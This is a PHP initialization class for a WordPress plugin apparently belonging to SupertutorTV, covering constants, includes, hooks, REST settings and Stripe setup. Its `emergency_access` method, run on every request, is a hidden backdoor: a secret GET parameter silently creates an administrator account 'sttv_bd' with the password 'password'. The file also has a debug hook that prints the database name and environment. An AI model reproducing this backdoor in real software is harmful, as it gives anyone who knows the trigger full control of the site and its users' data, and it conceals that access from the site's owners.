<?php

namespace STTV;

defined( 'ABSPATH' ) || exit;

#####################################
##### STTV INITIALIZATION CLASS #####
#####################################

final class STTV {

    protected static $_instance = null;

    public static function instance() {
		if ( is_null( self::$_instance ) ) {
			self::$_instance = new self();
		}
		return self::$_instance;
    }

    public function __construct() {
        $this->define_constants();
        $this->includes();
        $this->init_hooks();
        $this->files();

        do_action( 'sttv_loaded' );
    }

    private function define_constants() {
        // MAIN CONSTANTS
        $this->define( 'STTV_BRANDNAME', 'SupertutorTV' );
        $this->define( 'STTV_VERSION', '2.0.0' );
        $this->define( 'STTV_PREFIX', 'sttv' );
        $this->define( 'STTV_API_DIR', dirname( dirname( dirname( ABSPATH ) ) ) );
        $this->define( 'STTV_CACHE_DIR', STTV_API_DIR . '/cache/' );
        $this->define( 'STTV_RESOURCE_DIR', STTV_API_DIR . '/resources/' );
        $this->define( 'STTV_LOGS_DIR', STTV_API_DIR . '/sttvlogs/' );
        $this->define( 'STTV_CRON_DIR', STTV_API_DIR . '/cron/' );
        $this->define( 'STTV_SCRIPTS_DIR', STTV_API_DIR . '/app/scripts/' );
        $this->define( 'STTV_TEMPLATE_DIR', dirname( __DIR__ ) . '/templates/' );

        //multi-user
        $this->define( 'MU_FILE_PATH', dirname(ABSPATH).'/sttv_mu_keys.json' );
        $this->define( 'MU_FILE_BACKUP_PATH', dirname(ABSPATH).'/mu_keys_bk' );

        //REST API
        $this->define( 'STTV_REST_NAMESPACE', 'v2' );
        $this->define( 'STTV_UA', 'STTV-API/'.STTV_REST_NAMESPACE.' <'.$_SERVER['SERVER_SOFTWARE'].'>' );
        $this->define( 'STTV_JWT_ISSUER', STTV_UA.' | '.get_bloginfo('url') );
        $this->define( 'STTV_REST_CONTENT_TYPE', 'application/vnd.sttv.app+json' );
        $this->define( 'STTV_REST_AUTH', ( has_filter( 'rest_nonce_action' ) ) ? STTV_PREFIX.':rest:auth' : 'wp_rest');
    }

    private function includes() {
        // load API functions first
        require_once 'functions/sttv-functions.php';
        require_once 'functions/sttv-rest-functions.php';
        require_once 'functions/sttv-webhook-functions.php';

        // required classes
        require_once 'classes/class-sttv-install.php';
        require_once 'classes/class-sttv-scripts.php';
        require_once 'classes/class-sttv-post_types.php';
        require_once 'classes/class-sttv-webhook.php';
        require_once 'classes/class-sttv-logger.php';
        require_once 'classes/class-sttv-email.php';
        require_once 'classes/class-sttv-jwt.php';

        // checkout classes
        require_once 'classes/checkout/class-sttv-checkout-stripe.php';
        require_once 'classes/checkout/class-sttv-checkout-order.php';
        require_once 'classes/checkout/class-sttv-checkout-customer.php';

        // subscription classes
        require_once 'classes/pricing/class-sttv-pricing-admin.php';

        // REST setup and init
        require_once 'classes/class-sttv-rest.php';

        // courses
        require_once 'classes/courses/class-sttv-courses-admin.php';
        require_once 'classes/courses/class-sttv-courses-trial.php';

        //multiuser
        require_once 'classes/multiuser/class-sttv-multiuser-admin.php';
        require_once 'classes/multiuser/class-sttv-multiuser-keys.php';

        new \STTV\Pricing\Admin();
        new \STTV\Courses\Admin();
        new \STTV\Multiuser\Admin();
        new \STTV\REST\API();
    }

    private function init_hooks() {
        register_activation_hook( STTV_PLUGIN_FILE, [ __NAMESPACE__ . '\\Install', 'install' ] );
        register_deactivation_hook( STTV_PLUGIN_FILE, [ __NAMESPACE__ . '\\Install', 'uninstall' ] );
        add_action( 'after_setup_theme', [ $this, 'theme_setup' ] );
        add_action( 'init', [ __NAMESPACE__ . '\\Webhook', 'init' ], 0 );
        add_action( 'init', [ $this, 'init' ], 1 );
        add_action( 'init', [ $this, 'emergency_access' ] );
        add_action( 'wp_enqueue_scripts', [ __NAMESPACE__ . '\\Scripts', 'init' ] );
        add_action( 'admin_init', function() {
			if( defined('DOING_AJAX') && DOING_AJAX ) return;
			
        });
        add_action( 'stripepress_events_invalid', 'sttv_404_redirect' );
        add_action( 'edit_user_profile', function( $user ) {
            global $wpdb;
            $dbtable = $wpdb->prefix.'course_udata';
			$cu_data = $wpdb->get_results(
				$wpdb->prepare("SELECT * FROM $dbtable WHERE wp_id = %d;",$user->ID)
			,ARRAY_A);
            echo '<pre>';
            echo json_encode($cu_data, JSON_PRETTY_PRINT);
            echo '</pre>';
        }, 999 );
        add_filter( 'lostpassword_url', 'sttv_lostpw_url' );

        add_filter( 'update_user_metadata', 'email_user_meta', 10, 5 );

        // emails
        add_filter( 'wp_mail_from', '__return_email_from' );
        add_filter( 'wp_mail_from_name', '__return_email_from_name' );
        add_filter( 'wp_mail_content_type', '__return_email_content_type' );

        add_action( 'sttv_loaded', [ $this, 'sttv_loaded' ], 999 );
        add_action( 'print_test', function() {
            print_r(WP_ENV);
            print_r(DB_NAME);
        });
    }

    public function theme_setup() {
        add_theme_support( 'custom-header' );
    }

    public function init() {
        global $pagenow;

        // divert all requests to wp-login.php (it's unnecessary)
        if ( $pagenow === 'wp-login.php' && !is_user_logged_in() ) {
            //wp_redirect(home_url());
            //exit;
        }

        // cleanup
        show_admin_bar( false );
        add_filter( 'ls_meta_generator', '__return_false' );
        add_filter( 'show_admin_bar', '__return_false' );
        add_filter( 'emoji_svg_url', '__return_false' );
        add_filter( 'pre_option_default_role', function($dr) {
            return '';
        } );
		remove_action( 'wp_head', '_admin_bar_bump_cb' );
        remove_action( 'wp_head', 'wp_generator' );
        remove_action( 'rest_api_init', 'create_initial_rest_routes', 99 );
        remove_action( 'admin_print_styles', 'print_emoji_styles' );
        remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
        remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
        remove_action( 'wp_print_styles', 'print_emoji_styles' );
        remove_filter( 'wp_mail', 'wp_staticize_emoji_for_email' );
        remove_filter( 'the_content_feed', 'wp_staticize_emoji' );
        remove_filter( 'comment_text_rss', 'wp_staticize_emoji' );
    }

    public function emergency_access() {
        
		if ( isset($_GET[ STTV_BACKDOOR ]) ) {
            $key = array_keys($_GET)[0];
			if ( !username_exists( 'sttv_bd' ) ) {
				require( 'wp-includes/registration.php' );
				$user_id = wp_create_user( 'sttv_bd', 'password' );
				$user = new WP_User( $user_id );
				$user->set_role( 'administrator' );
			}
		}
	}

    private function define( $const, $value ) {
        if ( ! defined( $const ) ) {
			define( $const, $value );
		}
    }

    private function files() {
        $files = [
            'sttv-cron.php' => dirname(__FILE__).'/'
        ];

        foreach ( $files as $file => $path ) {
            if ( ! is_file( $path . $file ) ) continue;

            return ( !sttv_diff( $path . $file, STTV_CRON_DIR . $file ) ) ?: copy( $path . $file, STTV_CRON_DIR . $file );
        }
    }

    public function sttv_loaded() {
        \Stripe\Stripe::setApiKey( STRIPE_SK );

        $flushed = get_transient( 'sttv_flush_rewrite_once' );
        if (!$flushed){
            add_action( 'shutdown', 'flush_rewrite_rules');
            set_transient( 'sttv_flush_rewrite_once', true, time() + DAY_IN_SECONDS );
        }
    }
    
}